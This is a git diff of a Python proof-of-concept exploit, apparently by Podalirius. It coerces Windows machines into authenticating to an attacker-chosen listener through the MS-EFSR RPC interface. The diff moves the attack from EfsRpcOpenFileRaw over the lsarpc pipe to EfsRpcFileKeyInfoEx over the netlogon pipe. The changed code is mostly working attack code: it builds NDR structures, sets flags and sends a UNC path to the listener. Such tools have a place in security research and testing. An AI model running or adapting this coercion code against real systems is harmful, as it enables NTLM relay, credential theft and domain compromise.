@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # File name          : coerce_poc.py
 # Author             : Podalirius (@podalirius_)
-# Date created       : 22 Jun 2022
+# Date created       : 01 July 2022
 
 
 import sys
@@ -28,16 +28,24 @@ class DCERPCSessionError(DCERPCException):
         else:
             return 'SessionError: unknown error code: 0x%x' % self.error_code
 
-
-class EfsRpcOpenFileRaw(NDRCALL):
-    opnum = 0
+class EFS_RPC_BLOB(NDRSTRUCT):
     structure = (
-        ('FileName', WSTR),  # Type: wchar_t *
-        ('Flags', LONG),     # Type: long
+        ('Data', DWORD),
+        ('cbData', PCHAR),
     )
 
 
-class EfsRpcOpenFileRawResponse(NDRCALL):
+class EfsRpcFileKeyInfoEx(NDRCALL):
+    opnum = 16
+    structure = (
+        ('dwFileKeyInfoFlags', DWORD), # Type: DWORD
+        ('Reserved', EFS_RPC_BLOB), # Type: EFS_RPC_BLOB *
+        ('FileName', WSTR), # Type: wchar_t *
+        ('InfoClass', DWORD), # Type: DWORD
+    )
+
+
+class EfsRpcFileKeyInfoExResponse(NDRCALL):
     structure = ()
 
 
@@ -107,15 +115,24 @@ class RPCProtocol(object):
 class MS_EFSR(RPCProtocol):
     uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
     version = "1.0"
-    pipe = r"\PIPE\lsarpc"
+    pipe = r"\pipe\netlogon"
 
-    def EfsRpcOpenFileRaw(self, listener):
+    def EfsRpcFileKeyInfoEx(self, listener):
         if self.dce is not None:
-            print("[>] Calling EfsRpcOpenFileRaw() ...")
+            print("[>] Calling EfsRpcFileKeyInfoEx() ...")
             try:
-                request = EfsRpcOpenFileRaw()
+                request = EfsRpcFileKeyInfoEx()
+                #
+                BASIC_KEY_INFO = 0x00000001
+                CHECK_COMPATIBILITY_INFO = 0x00000002
+                UPDATE_KEY_USED = 0x00000100
+                CHECK_DECRYPTION_STATUS = 0x00000200
+                CHECK_ENCRYPTION_STATUS = 0x00000400
+                #
+                request['dwFileKeyInfoFlags'] = BASIC_KEY_INFO
+                request['Reserved'] = EFS_RPC_BLOB()
                 request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
-                request['Flags'] = 0
+                request['InfoClass'] = 0
                 # request.dump()
                 resp = self.dce.request(request)
             except Exception as e:
@@ -125,8 +142,8 @@ class MS_EFSR(RPCProtocol):
 
 
 if __name__ == '__main__':
-    print("Windows auth coerce using MS-EFSR::EfsRpcOpenFileRaw()\n")
-    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-EFSR::EfsRpcOpenFileRaw()")
+    print("Windows auth coerce using MS-EFSR::EfsRpcFileKeyInfoEx() - by @podalirius_\n")
+    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-EFSR::EfsRpcFileKeyInfoEx()")
 
     parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
     parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
@@ -167,6 +184,6 @@ if __name__ == '__main__':
     )
 
     if connected:
-        protocol.EfsRpcOpenFileRaw(options.listener)
+        protocol.EfsRpcFileKeyInfoEx(options.listener)
 
     sys.exit()
